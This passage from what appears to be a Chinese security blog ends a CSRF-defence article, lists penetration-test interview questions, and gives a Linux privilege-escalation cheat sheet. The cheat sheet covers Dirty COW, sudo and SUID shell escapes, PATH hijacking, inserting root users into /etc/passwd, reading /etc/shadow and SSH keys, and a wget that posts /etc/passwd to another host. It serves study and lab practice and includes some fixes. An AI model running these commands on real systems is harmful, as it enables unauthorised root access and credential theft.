title="一般的防护手段"></a>一般的防护手段</h1><ol><li><p>图形验证码。</p></li><li><p>验证来源referer。</p></li><li><p>token，用post或ajax提交比较安全。</p></li><li><p>前后端分离情况，给cookie设置samesite属性（前提是用户浏览器支持），用来限制第三方cookie。SameSite&#x3D;Strict：当前页面的url和请求目标一致才允许发cookie。这个用户体验不会很好，比如在一个页面点击微博或者github链接，跳过去都是未登录状态。</p><p>SameSite&#x3D;Lax：只有以下请求可以发送cookie。</p><p>链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预加载：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prerender&quot;</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>get表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SameSite&#x3D;None：chrome的默认属性是Lax，可以通过None来关闭，前提是和secure属性一块使用，也就是说在https协议下使用。</p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/kclax/article/details/93908721">https://blog.csdn.net/kclax/article/details/93908721</a></p><p><a href="https://www.cnblogs.com/blacksunny/p/7940287.html">https://www.cnblogs.com/blacksunny/p/7940287.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/33742070">https://zhuanlan.zhihu.com/p/33742070</a></p><p><a href="https://blog.cm2.pw/forging-content-type-header-with-flash/">https://blog.cm2.pw/forging-content-type-header-with-flash/</a></p><p><a href="https://github.com/sp1d3r/swf_json_csrf">https://github.com/sp1d3r/swf_json_csrf</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次CT面经</title>
      <link href="/2021/05/28/8cf9a89e.html"/>
      <url>/2021/05/28/8cf9a89e.html</url>
      
        <content type="html"><![CDATA[<ol><li>印象深刻的一次漏洞挖掘。可以说说攻防项目里所做的事情。</li><li>是否接触过做过红队。</li><li>最近在做什么类型的项目。</li><li>最近在学习什么方向的内容。</li><li>SQL注入的类型。常用的注入方法。</li><li>绕过根据语义解析恶意字符的waf的方法。</li><li>报错注入的函数有哪些。</li><li>已经拿下Webshell，是MySQL数据库，要往里写文件除了要知道物理路径还需要什么条件。</li><li>MySQL高版本和低版本的利用方式有哪些差别。</li><li>延时注入MySQL数据库除了SLEEP()还有什么函数可以实现。</li><li>SQLServer提权除了XP_CMDSHELL组件还有什么方法。</li><li>注入的修复方式。</li><li>Mybatis数据库预编译时占位符是什么。</li><li>XSS原理。</li><li>Dom XSS原理，具体怎么实现的。</li><li>在开启了Httponly的情况下，怎么去利用XSS。</li><li>在进行命令执行等攻击的时候页面上没有回显怎么办，假如不能出网的话又该怎么办。</li><li>Redis主从复制漏洞的这个主从复制原理是什么。</li><li>CSRF修复的方式。</li><li>假如CSRF加入了Referer头验证，怎么去绕过。</li><li>Shiro的漏洞都有复现过吗。</li><li>Shiro不同版本之间的漏洞它们本质上的区别是什么。</li><li>Shiro反序列化漏洞利用的加密算法是什么。</li><li>Shiro反序列化漏洞的原理，处理Cookie的流程。</li><li>高版本的Shiro用的什么加解密模式。</li><li>Mimikatz是从系统的什么进程中读的Hash。</li><li>假如读取的Hash没有暴破出来该怎么办。</li><li>PTH研究过没有。</li><li>NTLM协议的认证流程。</li><li>Liunx权限维持有哪些方法。</li><li>Linux提权的方法有哪些。</li><li>代码审计做过哪些项目，Java的代审有接触过吗。</li><li>PHP文件包含用的函数名称。</li><li>利用PHP写的CMS漏洞研究过哪些。</li><li>应急响应有做过哪些项目，详细的需要检查什么配置。</li><li>3389登录成功日志的ID是多少。</li><li>内存马的具体排查流程，溯源的流程。</li><li>安卓测试的项目做过没。</li><li>怎么脱壳。</li><li>一般怎么进行安卓的测试。</li></ol><p>路还很长~</p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权小结</title>
      <link href="/2021/05/15/235e4160.html"/>
      <url>/2021/05/15/235e4160.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h1><p>用户和权限、内核、操作系统、日志、应用服务、组件、环境变量、计划任务、支持语言&#x2F;开发工具、目录文件权限、外部通信等。</p><p>用户和组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd  </span><br><span class="line">cat /etc/group </span><br></pre></td></tr></table></figure><p>哪些目录或文件可写或可执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -222 -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>命令行历史记录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line">history</span><br></pre></td></tr></table></figure><p>私钥信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>超级用户账户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;  </span><br></pre></td></tr></table></figure><p>目前登录的用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w           </span><br></pre></td></tr></table></figure><p>最后登录的用户以及信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">last  </span><br><span class="line">lastlog –u %username%</span><br><span class="line">lastlog |grep -v &quot;Never&quot;</span><br></pre></td></tr></table></figure><p>sudo权限相关。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l  </span><br></pre></td></tr></table></figure><p>可用的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells </span><br></pre></td></tr></table></figure><p>环境信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env        </span><br><span class="line">set</span><br></pre></td></tr></table></figure><p>进程信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>已安装的软件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line">dpkg -l</span><br></pre></td></tr></table></figure><p>系统详细信息：</p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p><a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></p><p>详细可参考：</p><p><a href="https://xz.aliyun.com/t/7924#toc-16">https://xz.aliyun.com/t/7924#toc-16</a></p><h1 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a><strong>内核漏洞</strong></h1><p>立竿见影，但有风险，系统可能会崩溃。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a               内核版本</span><br><span class="line">uname -r</span><br><span class="line">cat /etc/issue          发行版本</span><br><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure><p>searchsploit查询或其他脚本。</p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214557.png"></p><p>典型案例：脏牛CVE-2016-5195</p><p> (Linux kernel &gt;&#x3D; 2.6.22)    特权提升   Copy-on Write条件竞争越权写入文件，破坏只读内存映射，需要可读权限。</p><p>低于以下版本存在：</p><p>Centos7&#x2F;RHEL7    3.10.0-327.36.3.el7</p><p>Cetnos6&#x2F;RHEL6     2.6.32-642.6.2.el6</p><p>Ubuntu 16.10        4.8.0-26.28</p><p>Ubuntu 16.04         4.4.0-45.66</p><p>Ubuntu 14.04         3.13.0-100.147</p><p>Debian 8                3.16.36-1+deb8u2  </p><p>Debian 7                3.2.82-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt       编译</span><br><span class="line">./dirty password                            替换掉原来的root用户</span><br><span class="line">./dirty 文件名 内容                           写入文件</span><br><span class="line">./dirty /etc/passwd ttt:x:0:0:ttt,,,:/home/ttt:/bin/bash    加入root权限新用户</span><br></pre></td></tr></table></figure><h1 id="SUDO滥用"><a href="#SUDO滥用" class="headerlink" title="SUDO滥用"></a><strong>SUDO滥用</strong></h1><p>允许普通用户执行管理员权限命令的工具，验证自身密码后存在有效期限制，配置文件是&#x2F;etc&#x2F;sudoers，属性为0440，使用sudo时环境变量还是自己账户的。漏洞影响范围有限，只能影响小部分非标准配置的Linux服务器。</p><p>显示允许当前用户使用的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214750.png"></p><p><strong>find</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/sudoers -exec whoami \;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214759.png"></p><p><strong>nano</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/passwd</span><br><span class="line">ttt:$6$Bw5HKITy$vEN/QwAi6nDLnGboWtoeB45Gw2agHswSjxEWhA5JFFiJXMrlgfxIzHRvu99F.vOcxyaVmP98QBNHOn4QWg3nZ.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214818.png"></p><p>使用1234密码登录ssh。su切换用户也行。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214828.png"></p><p><strong>man</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">按!后回车</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214846.png"></p><p><strong>wget</strong></p><p>将目标服务器的passwd文件复制下来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget --post-file=/etc/passwd 172.16.1.1:8888</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515214922.png"></p><p>修改passwd添加root权限用户，密码1234。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttt:$6$Bw5HKITy$vEN/QwAi6nDLnGboWtoeB45Gw2agHswSjxEWhA5JFFiJXMrlgfxIzHRvu99F.vOcxyaVmP98QBNHOn4QWg3nZ.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>然后托管到web服务器上让目标服务器访问，登录新用户即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://172.16.1.1/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215001.png"></p><p><strong>less</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">按!后回车</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215041.png"></p><p><strong>vim</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c&#x27;!sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215112.png"></p><p><strong>awk</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;   </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215147.png"></p><p><strong>curl</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl file:///etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215238.png"></p><p><strong>apache2</strong></p><p>只能查看文件。</p><p>查看shadow文件破解hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure><p><strong>su</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215315.png"></p><h1 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a><strong>SUID</strong></h1><p>Linux的一种权限机制，调用者在执行这种文件时会暂时获得该文件拥有者的权限，从而提权。前提是二进制文件，且低权限用户本身对该文件必须有x权限。</p><p>具体表现：文件所有者可执行的权限标志位为s。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x</span><br></pre></td></tr></table></figure><p>如何设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod u-s filename</span><br></pre></td></tr></table></figure><p><strong>批量查找</strong></p><p>从根目录开始，查找具有SUID权限位且属主为root，且当前登录用户具有访问权限的二进制文件并输出它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><strong>find</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -lh /usr/bin/find</span><br><span class="line">chmod u+s /usr/bin/find</span><br><span class="line">find /tmp/test -exec whoami \;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210516121752.png"></p><p><strong>Nmap</strong></p><p>版本：2.02-5.21</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215509.png"></p><p>较新版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215526.png"></p><p><strong>Bash</strong></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215537.png"></p><p><strong>Vim or Vi</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215747.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215756.png"></p><p><strong>python</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215816.png"></p><p><strong>cp</strong></p><p>先备份。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd &gt; /home/qqq/pass</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515215855.png"></p><p>密码1234。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;aaa:$6$Bw5HKITy$vEN/QwAi6nDLnGboWtoeB45Gw2agHswSjxEWhA5JFFiJXMrlgfxIzHRvu99F.vOcxyaVmP98QBNHOn4QWg3nZ.:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /home/qqq/pass</span><br><span class="line">cp /home/qqq/pass /etc/passwd</span><br><span class="line">su aaa</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220012.png"></p><p><strong>awk</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><strong>morpheus</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morpheus &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><strong>Less or More</strong>                    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><strong>man</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><strong>mv</strong></p><p>覆盖passwd或shadow文件。</p><p><strong>Nano</strong></p><p>参考sudo滥用。</p><p><strong>wget</strong></p><p>参考sudo滥用。</p><p><strong>apache</strong></p><p>参考sudo滥用。</p><p><strong>修复建议</strong></p><p>1、该类型问题本质上讲是配置上的问题，需要仔细排查系统中包含s标记位的可执行文件，确保其不可被利用造成提权操作。</p><p>从根目录开始，查找具有SUID权限位且属主为高权限用户例如root，且当前登录用户具有访问权限的二进制文件并输出它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>2、若有业务需求，必须给某可执行文件或进程设置特权供非特权用户使用，可以引入capabilities，这是linux 2.2及以后版本系统的水平权限分离的机制，root权限可以被分割成不同粒度的子权限，实现小权限分配，符合权限最小化原则，具体配置可参考：</p><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p><p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">https://www.cnblogs.com/sparkdev/p/11417781.html</a></p><p>配置之后，权限检查过程就变成了：判断用户身份，如果是非特权用户则去检查该操作对应的capabilites，由此判断是否允许执行。</p><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h1><p>cronjobs，以root特权运行。</p><p>主要思路是分析哪些计划任务脚本是低权限可写的，若可写则修改内容加入提权操作，如suid提权、反弹shell等操作，等待任务执行则提权成功。一般机器的计划任务都是root下可写，权限不够不好利用。普通用户可以列出&#x2F;etc&#x2F;下的计划任务，不能列root用户的计划任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">crontab -l显示当前用户的cron</span><br><span class="line">ls -la /etc/cron*显示计划的作业概述</span><br></pre></td></tr></table></figure><p>添加用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ttt:x:0:0:ttt,,,:/home/ttt:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><p>配置suid。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s /bin/bash</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod u+s /tmp/bash&#x27; &gt; /tmp/bash</span><br><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os </span><br><span class="line">os.system(&#x27;cp /bin/sh /tmp/sh&#x27;) </span><br><span class="line">os.system(&#x27;chmod u+s /tmp/sh&#x27;) </span><br><span class="line">或者</span><br><span class="line">os.system(&#x27;chmod u+s /bin/bash&#x27;) </span><br></pre></td></tr></table></figure><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a><strong>环境变量</strong></h1><p>如果环境变量中有”.”，代表着管理员没有指定程序的完整路径，意味着可以执行当前目录里的文件，也就是说想要执行某目录下的可执行文件时不用加”.&#x2F;“，直接文件名就可以了。主要思路还是在于找到具有SUID权限的文件，环境变量中有自己能控制的路径。</p><p>原理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure><p>临时添加，立即生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=.:$PATH   或者   $PATH=.:$&#123;PATH&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220733.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo Hello world&quot; &gt; /home/c3156/ls &amp;&amp; chmod 777 /home/c3156/ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220744.png"></p><p>模拟攻击环境。</p><p>受害者服务器中存在脚本，作用是普通用户需要以root用户身份调用该脚本执行某些操作，脚本中调用了某些系统二进制文件。</p><p>创建并编译该文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220755.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test1 &amp;&amp; chmod u+s test1</span><br><span class="line">ls -lh test1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220816.png"></p><p>此时登录低权限账户，模拟提权环境，先查找服务器中具有SUID权限的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220824.png"></p><p>运行脚本看效果，作用为查看当前目录下的文件，执行真实存在的ls二进制文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220836.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/sh&quot; &gt; /tmp/ls  或者 cp /bin/sh /tmp/ls</span><br><span class="line">chmod 777 /tmp/ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./test1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220914.png"></p><p>目录权限足够可以利用软链接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ls</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">test1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210515220947.png"></p><h1 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a><strong>迁移进程</strong></h1><p>找到root运行的服务，以服务shell执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep root</span><br></pre></td></tr></table></figure><h1 id="写入明文root密码或读hash"><a href="#写入明文root密码或读hash" class="headerlink" title="写入明文root密码或读hash"></a><strong>写入明文root密码或读hash</strong></h1><p>鸡肋，一般passwd全用户可读，root可写，shadow只有root可读。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l passwd shadow</span><br></pre></td></tr></table></figure><p>替换passwd的root密码X为指定hash。</p><p>密码1234</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$Bw5HKITy$vEN/QwAi6nDLnGboWtoeB45Gw2agHswSjxEWhA5JFFiJXMrlgfxIzHRvu99F.vOcxyaVmP98QBNHOn4QWg3nZ.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>暴破shadow里的root的hash。</p><h1 id="各种服务"><a href="#各种服务" class="headerlink" 